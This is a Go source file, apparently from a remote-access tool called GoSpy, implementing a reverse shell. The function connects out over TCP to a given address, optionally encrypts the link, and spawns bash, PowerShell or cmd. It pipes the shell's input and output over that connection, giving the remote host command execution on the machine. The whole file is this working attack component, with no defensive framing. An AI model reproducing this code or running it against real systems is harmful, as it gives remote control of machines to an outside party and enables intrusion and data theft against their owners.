package commands

import (
	"github.com/psidex/GoSpy/internal/comms"
	"log"
	"net"
	"os/exec"
	"runtime"
)

// StartReverseShell starts a reverse shell from the current machine to address.
func StartReverseShell(address, password string) {
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return
	}

	var c comms.Connection
	if password != "" {
		c = comms.NewEncryptedConn(conn, password)
	} else {
		c = comms.NewPlainConn(conn)
	}
	defer c.Close()

	shellString := "/bin/bash"

	if runtime.GOOS == "windows" {
		_, err := exec.LookPath("Powershell")
		if err != nil {
			shellString = "cmd /C"
		} else {
			shellString = "Powershell"
		}
	}

	defer log.Println("Exited reverse shell process")
	cmd := exec.Command(shellString)

	cmdOut, err := cmd.StdoutPipe()
	if err != nil {
		return
	}

	cmdIn, err := cmd.StdinPipe()
	if err != nil {
		return
	}

	cmdOutErr := comms.BridgeReaderToConnection(cmdOut, c)
	cmdInErr := comms.BridgeConnectionToWriter(c, cmdIn)

	err = cmd.Start()
	if err != nil {
		return
	}

	// Wait until an error happens and then just stop.
	select {
	case <-cmdOutErr:
		return
	case <-cmdInErr:
		return
	}
}
